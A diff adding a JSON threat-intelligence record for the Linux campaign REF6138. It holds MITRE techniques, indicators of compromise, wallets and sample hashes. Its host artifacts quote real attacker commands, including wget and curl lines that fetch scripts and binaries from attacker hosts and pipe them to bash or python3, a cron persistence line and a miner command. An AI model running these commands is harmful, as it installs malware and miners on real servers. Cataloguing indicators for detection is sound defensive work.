@@ -1,0 +1,487 @@
+{
+  "malware_family": "REF6138",
+  "threat_actor": "REF6138",
+  "platforms": [
+    "linux"
+  ],
+  "summary": "A multi-stage campaign targeting Linux Apache2 servers for initial access. The threat actor deploys RUDEDEVIL and KAIJI malware for cryptomining and DDoS, and uses the GSOCKET tool for persistent, masqueraded C2. The campaign also involves custom malware, privilege escalation attempts using pwnkit, and abuse of online gambling APIs.",
+  "mitre_techniques": [
+    "T1587.001",
+    "T1588.002",
+    "T1608.002",
+    "T1608.003",
+    "T1190",
+    "T1059.004",
+    "T1059.006",
+    "T1053.003",
+    "T1546.004",
+    "T1505.003",
+    "T1068",
+    "T1140",
+    "T1222.002",
+    "T1564.001",
+    "T1070.006",
+    "T1036.004",
+    "T1027",
+    "T1057",
+    "T1082",
+    "T1061",
+    "T1049",
+    "T1007",
+    "T1119",
+    "T1005",
+    "T1071.001",
+    "T1132.001",
+    "T1001",
+    "T1573.001",
+    "T1105",
+    "T1571",
+    "T1572",
+    "T1102",
+    "T1496"
+  ],
+  "host_artifacts": [
+    {
+      "kind": "command_line",
+      "value": "sh -c wget http://107.178.101.245:5488/l64;chmod 777 l64;./l64;rm -r l64;wget http://107.178.101.245:5488/l86;chmod 777 l86;./l86;rm -r l86",
+      "context": "Initial malware download and execution via backdoored web server.",
+      "specificity": "high",
+      "evidence": "explicit_literal",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "unique_string",
+      "value": "Hi, man. I've seen several organizations report my Trojan recently, \nPlease let me go. I want to buy a car. That's all. I don't want to hurt others. \nI can't help it. My family is very poor. In China, it's hard to buy a suite. \nI don't have any accommodation. I don't want to do anything illegal. \nReally, really, interested, you can give me XmR, my address is 42cjpfp1jJ6pxv4cbjxbbrmhp9yuzsxh6v5kevp7xzngklnutnzqvu9bhxsqbemstvdwymnsysietq5vubezyfoq4ft4ptc, \nthank yo",
+      "context": "Embedded message in RUDEDEVIL/LUCIFER malware.",
+      "specificity": "high",
+      "evidence": "explicit_literal",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "command_line",
+      "value": "-o stratum+tcp://auto.c3pool.org:19999 -u 41qBGWTRXUoUMGXsr78Aie3LYCBSDGZyaQeceMxn11qi9av1adZqsVWCrUwhhwqrt72qTzMbweeqMbA89mnFepja9XERfHL -p R",
+      "context": "XMRIG mining command used by RUDEDEVIL.",
+      "specificity": "high",
+      "evidence": "explicit_literal",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "command_line",
+      "value": "exec -a [raid5wq] /home/user/.config/htop/htop -s /home/user/.config/htop/defunct.dat -q -d",
+      "context": "GSOCKET execution masquerading as a kernel process.",
+      "specificity": "high",
+      "evidence": "figure_or_disassembly",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "process_name",
+      "value": "[raid5wq]",
+      "context": "GSOCKET masquerading as a kernel process name.",
+      "specificity": "medium",
+      "evidence": "figure_or_disassembly",
+      "origin_tool": "GSOCKET",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "file_path",
+      "value": "/dev/shm/.gs-1000",
+      "context": "Directory created by GSOCKET to store its binary.",
+      "specificity": "high",
+      "evidence": "prose",
+      "origin_tool": "GSOCKET",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "file_path",
+      "value": "/home/user/.config/htop/",
+      "context": "Directory used by GSOCKET to store binary and secret key.",
+      "specificity": "medium",
+      "evidence": "prose",
+      "origin_tool": "GSOCKET",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "unique_string",
+      "value": "gsocket: gs_funcs not found",
+      "context": "Error string found in GSOCKET binaries.",
+      "specificity": "high",
+      "evidence": "strings_listing",
+      "origin_tool": "GSOCKET",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "unique_string",
+      "value": "GSOCKET_SECRET",
+      "context": "Environment variable string found in GSOCKET.",
+      "specificity": "high",
+      "evidence": "strings_listing",
+      "origin_tool": "GSOCKET",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "unique_string",
+      "value": "|(odk)/*-",
+      "context": "Postfix removed from KAIJI C2 server address during decoding.",
+      "specificity": "high",
+      "evidence": "prose",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "file_path",
+      "value": "/etc/id.services.conf",
+      "context": "File created by KAIJI for persistence.",
+      "specificity": "high",
+      "evidence": "prose",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "file_path",
+      "value": "/etc/32678",
+      "context": "File created by KAIJI for persistence.",
+      "specificity": "high",
+      "evidence": "prose",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "file_path",
+      "value": "/dev/.img",
+      "context": "File created by KAIJI for persistence.",
+      "specificity": "high",
+      "evidence": "prose",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "file_path",
+      "value": "/boot/System.img.config",
+      "context": "Executable file created by KAIJI for persistence via Systemd.",
+      "specificity": "high",
+      "evidence": "prose",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "file_path",
+      "value": "/usr/lib/libd1rpcld.so",
+      "context": "Malicious library dropped by KAIJI.",
+      "specificity": "high",
+      "evidence": "prose",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "process_name",
+      "value": "pspy64",
+      "context": "Process snooping tool executed by threat actor.",
+      "specificity": "medium",
+      "evidence": "prose",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "parent_child",
+      "value": "[rcu_preempt] -> pspy64",
+      "context": "pspy64 executed from GSOCKET backdoor masquerading as kernel process.",
+      "specificity": "medium",
+      "evidence": "prose",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "file_name",
+      "value": "apache2",
+      "context": "Custom-built malware with zero VT detections.",
+      "specificity": "medium",
+      "evidence": "prose",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "unique_string",
+      "value": "yyyyyyyy",
+      "context": "XOR key for custom apache2 malware strings, from YARA rule.",
+      "specificity": "high",
+      "evidence": "strings_listing",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "hex_pattern",
+      "value": "{ 74 73 0A 1C 1A 54 1A 11 54 0C 18 43 59 5B 3A 11 0B 16 14 10 0C 14 5B }",
+      "context": "XOR-encoded string from custom apache2 malware.",
+      "specificity": "high",
+      "evidence": "strings_listing",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "command_line",
+      "value": "* * * * * wget -q -O - http://gcp.pagaelrescate.com:8080/ifindyou|bash",
+      "context": "Cron job to download and execute `ifindyou` script.",
+      "specificity": "high",
+      "evidence": "prose",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "command_line",
+      "value": "curl -s http://gcp.pagaelrescate.com:8080/cycnet | bash",
+      "context": "Command to download and execute `cycnet` script for Telegram exfil.",
+      "specificity": "high",
+      "evidence": "prose",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "command_line",
+      "value": "curl -s http://gcp.pagaelrescate.com:8080/testslot/enviador_slot | python3",
+      "context": "Cron job to download and execute gambling bot script.",
+      "specificity": "high",
+      "evidence": "prose",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "process_name",
+      "value": "[mm_percpu_wq]",
+      "context": "GSOCKET masquerade for SSL connection.",
+      "specificity": "medium",
+      "evidence": "prose",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "unique_string",
+      "value": "https://github.com/nicocha30/ligolo-ng",
+      "context": "Hardcoded string in suspected Ligolo-ng tool.",
+      "specificity": "high",
+      "evidence": "strings_listing",
+      "origin_tool": "Ligolo-ng",
+      "hash_algo": "",
+      "hash_value": ""
+    }
+  ],
+  "network_artifacts": [
+    {
+      "kind": "ip",
+      "value": "107.178.101.245",
+      "context": "Malware file server (Rejetto).",
+      "specificity": "low",
+      "evidence": "ioc_list",
+      "origin_tool": ""
+    },
+    {
+      "kind": "domain",
+      "value": "nishabii.xyz",
+      "context": "RUDEDEVIL C2 domain from decrypted config.",
+      "specificity": "high",
+      "evidence": "encrypted_config",
+      "origin_tool": ""
+    },
+    {
+      "kind": "domain",
+      "value": "auto.c3pool.org",
+      "context": "Mining pool used by RUDEDEVIL.",
+      "specificity": "medium",
+      "evidence": "explicit_literal",
+      "origin_tool": ""
+    },
+    {
+      "kind": "ip",
+      "value": "62.72.22.91",
+      "context": "Server hosting custom `apache2` malware.",
+      "specificity": "low",
+      "evidence": "ioc_list",
+      "origin_tool": ""
+    },
+    {
+      "kind": "ip",
+      "value": "91.92.241.103",
+      "context": "C2 server used to download `gk.php` backdoor.",
+      "specificity": "low",
+      "evidence": "ioc_list",
+      "origin_tool": ""
+    },
+    {
+      "kind": "ip",
+      "value": "3.147.53.183",
+      "context": "C2 server for Python reverse shell.",
+      "specificity": "low",
+      "evidence": "ioc_list",
+      "origin_tool": ""
+    },
+    {
+      "kind": "domain",
+      "value": "gcp.pagaelrescate.com",
+      "context": "Hosting domain for miner, scripts, and gambling bot C2.",
+      "specificity": "high",
+      "evidence": "ioc_list",
+      "origin_tool": ""
+    },
+    {
+      "kind": "url",
+      "value": "http://gcp.pagaelrescate.com:8080/ifindyou",
+      "context": "URL to download mining stager script.",
+      "specificity": "high",
+      "evidence": "ioc_list",
+      "origin_tool": ""
+    },
+    {
+      "kind": "url",
+      "value": "http://gcp.pagaelrescate.com:8080/t9r/SystemdXC",
+      "context": "URL to download XMRIG miner (SystemdXC).",
+      "specificity": "high",
+      "evidence": "ioc_list",
+      "origin_tool": ""
+    },
+    {
+      "kind": "uri_path",
+      "value": "/934d9091-c90f-4edf-8b18-d44721ba2cdc",
+      "context": "Decoded URI path from custom apache2 malware.",
+      "specificity": "high",
+      "evidence": "explicit_literal",
+      "origin_tool": ""
+    },
+    {
+      "kind": "user_agent",
+      "value": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.",
+      "context": "Decoded User-Agent from custom apache2 malware (note trailing dot).",
+      "specificity": "high",
+      "evidence": "explicit_literal",
+      "origin_tool": ""
+    },
+    {
+      "kind": "http_header",
+      "value": "sec-ch-ua: \"Chromium\";v=\"122\", \"Google Chrome\";v=\"122\", \"Not-A.Brand\";v=\"99",
+      "context": "Decoded HTTP header from custom apache2 malware.",
+      "specificity": "high",
+      "evidence": "explicit_literal",
+      "origin_tool": ""
+    },
+    {
+      "kind": "http_header",
+      "value": "referer: https://twitter.com",
+      "context": "Decoded HTTP Referer header from custom apache2 malware.",
+      "specificity": "high",
+      "evidence": "explicit_literal",
+      "origin_tool": ""
+    },
+    {
+      "kind": "http_header",
+      "value": "accept-language: ru,en-US;q=0.9",
+      "context": "Decoded HTTP Accept-Language header from custom apache2 malware.",
+      "specificity": "medium",
+      "evidence": "explicit_literal",
+      "origin_tool": ""
+    },
+    {
+      "kind": "domain",
+      "value": "api.telegram.org",
+      "context": "Domain used for exfiltrating data via Telegram bot.",
+      "specificity": "low",
+      "evidence": "figure_or_disassembly",
+      "origin_tool": ""
+    },
+    {
+      "kind": "other",
+      "value": "1CSUkd5FZMis5NDauKLDkcpvvgV1zrBCBz",
+      "context": "Bitcoin wallet used for XMRIG mining.",
+      "specificity": "high",
+      "evidence": "ioc_list",
+      "origin_tool": ""
+    },
+    {
+      "kind": "other",
+      "value": "41qBGWTRXUoUMGXsr78Aie3LYCBSDGZyaQeceMxn11qi9av1adZqsVWCrUwhhwqrt72qTzMbweeqMbA89mnFepja9XERfHL",
+      "context": "XMR wallet used by RUDEDEVIL.",
+      "specificity": "high",
+      "evidence": "ioc_list",
+      "origin_tool": ""
+    },
+    {
+      "kind": "other",
+      "value": "42CJPfp1jJ6PXv4cbjXbBRMhp9YUZsXH6V5kEvp7XzNGKLnuTNZQVU9bhxsqBEMstvDwymNSysietQ5VubezYfoq4fT4Ptc",
+      "context": "XMR wallet from RUDEDEVIL's embedded message.",
+      "specificity": "high",
+      "evidence": "explicit_literal",
+      "origin_tool": ""
+    }
+  ],
+  "samples": [
+    {
+      "sha256": "82c55c169b6cb5e348be6e202163296b2b5d80fff2be791c21da9a8b84188684",
+      "description": "Custom apache2 malware, unpacked"
+    },
+    {
+      "sha256": "0fede7231267afc03b096ee6c1d3ded479b10ab235e260120bc9f68dd1fc54dd",
+      "description": "Custom apache2 malware, UPX packed"
+    },
+    {
+      "sha256": "72ac2877c9e4cd7d70673c0643eb16805977a9b8d55b6b2e5a6491db565cee1f",
+      "description": "SystemdXC (XMRIG miner)"
+    },
+    {
+      "sha256": "9ee695e55907a99f097c4c0ad4eb24ae5cf3f8215e9904d787817f1becb9449e",
+      "description": "download.sh KAIJI Stager"
+    },
+    {
+      "sha256": "d0ef2f020082556884361914114429ed82611ef8de09d878431745ccd07c06d8",
+      "description": "KAIJI x64"
+    },
+    {
+      "sha256": "1cdfb522acb1ad0745a4b88f072e40bf9aa113b63030fe002728bac50a46ae79",
+      "description": "KAIJI x86"
+    },
+    {
+      "sha256": "e19fb249db323d2388e91f92ff0c8a7a169caf34c3bdaf4d3544ce6bfb8b88b4",
+      "description": "KAIJI ARM64"
+    },
+    {
+      "sha256": "09f935acbac36d224acfb809ad82c475d53d74ab505f057f5ac40611d7c3dbe7",
+      "description": "RUDEDEVIL/LUFICER x64 version 0"
+    },
+    {
+      "sha256": "ea0068702ea65725700b1dad73affe68cf29705c826d12a497dccf92d3cded46",
+      "description": "RUDEDEVIL/LUFICER x64 version 1"
+    },
+    {
+      "sha256": "20899c5e2ecd94b9e0a8d1af0114332c408fb65a6eb3837d4afee000b2a0941b",
+      "description": "RUDEDEVIL/LUFICER x86 version 0"
+    }
+  ],
+  "file_types": [
+    "elf",
+    "script"
+  ]
+}
